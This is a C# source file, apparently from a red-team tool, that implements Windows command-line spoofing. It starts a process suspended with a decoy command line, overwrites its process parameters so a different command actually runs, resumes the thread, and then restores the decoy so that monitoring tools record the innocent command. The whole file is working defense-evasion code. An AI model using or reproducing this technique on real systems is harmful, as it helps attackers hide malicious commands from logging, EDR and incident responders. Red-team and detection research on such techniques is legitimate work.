using System;
using System.Runtime.InteropServices;
using System.Threading;
using CommandLineSpoofing.Interop;

namespace CommandLineSpoofing.Library
{
    internal class Modules
    {
        public static bool CreateCommandLineSpoofedProcess(
            string commandLineOriginal,
            string commandLineExecute,
            string windowTitle)
        {
            int error;
            int nSuspendedCount;
            bool status;
            string fakeImagePathName;
            string realImagePathName;
            PeFile pefile;
            string arch;

            fakeImagePathName = Helpers.ResolveImagePathName(commandLineOriginal);

            if (string.IsNullOrEmpty(fakeImagePathName))
            {
                Console.WriteLine("[-] Failed to resolve executable image path for fake command line.");

                return false;
            }

            realImagePathName = Helpers.ResolveImagePathName(commandLineExecute);

            if (string.IsNullOrEmpty(realImagePathName))
            {
                Console.WriteLine("[-] Failed to resolve executable image path for real command line.");

                return false;
            }

            pefile = new PeFile(fakeImagePathName);
            arch = pefile.GetArchitecture();
            pefile.Dispose();

            Console.WriteLine("[>] Trying to Command Line Spoofing.");
            Console.WriteLine("    [*] Original Command Line : {0}", commandLineOriginal);
            Console.WriteLine("        |-> Image Path   : {0}", fakeImagePathName);
            Console.WriteLine("        |-> Architecture : {0}", arch);
            Console.WriteLine("    [*] Execute Command Line : {0}", commandLineExecute);

            if ((arch == "x86") && (IntPtr.Size != 4))
            {
                Console.WriteLine("[!] To use 32bit image, should be built as 32bit binary.");

                return false;
            }
            else if ((arch == "x64") && (IntPtr.Size != 8))
            {
                Console.WriteLine("[!] To use 64bit image, should be built as 64bit binary.");

                return false;
            }
            else if ((arch != "x86") && (arch != "x64"))
            {
                Console.WriteLine("[!] Invalid image file.");

                return false;
            }

            if (string.Compare(
                fakeImagePathName,
                realImagePathName,
                StringComparison.OrdinalIgnoreCase) != 0)
            {
                Console.WriteLine("[!] Image name path for real command line does not match fake command line's one.");
                Console.WriteLine("    |-> Image Name Path (Fake) : {0}", fakeImagePathName);
                Console.WriteLine("    |-> Image Name Path (Real) : {0}", realImagePathName);
            }

            Console.WriteLine("[>] Trying to create suspended process.");

            status = Utilities.CreateSuspendedProcess(
                commandLineOriginal,
                out PROCESS_INFORMATION processInfo);

            if (!status)
            {
                error = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Failed to execute suspended process.");
                Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));

                return false;
            }
            else
            {
                Console.WriteLine("[+] Suspended process is created successfully.");
            }

            Console.WriteLine("[>] Trying to modify process parameters for suspended process.");

            status = Utilities.SetCommandLineSpoofedParameters(
                processInfo.hProcess,
                fakeImagePathName,
                commandLineOriginal,
                commandLineExecute,
                windowTitle);

            if (!status)
            {
                Console.WriteLine("[-] Failed to modify process parameters.");
                Console.WriteLine("[*] The suspended process will be terminated.");
                NativeMethods.TerminateProcess(processInfo.hProcess, 0);

                return false;
            }
            else
            {
                Console.WriteLine("[+] Process parameters are modified successfully.");
            }

            Console.WriteLine("[>] Trying to resume suspended process's thread.");

            nSuspendedCount = NativeMethods.ResumeThread(processInfo.hThread);

            if (nSuspendedCount == -1)
            {
                error = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Failed to resume thread.");
                Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
                Console.WriteLine("[*] The suspended process will be terminated.");
                NativeMethods.TerminateProcess(processInfo.hProcess, 0);

                return false;
            }
            else
            {
                Console.WriteLine("[+] Suspended process's thread is resumed successfully.");
            }

            Thread.Sleep(100); // This sleep requires to execute command

            Console.WriteLine("[>] Reverting process parameters.");

            status = Utilities.UpdateCommandLine(
                processInfo.hProcess,
                commandLineOriginal);

            if (!status)
            {
                error = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Failed to revert process parameters.");
                Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
            }
            else
            {
                Console.WriteLine("[+] Process parameters is reverted successfully.");
            }

            NativeMethods.CloseHandle(processInfo.hThread);
            NativeMethods.CloseHandle(processInfo.hProcess);

            Console.WriteLine("[*] Completed.");

            return status;
        }
    }
}
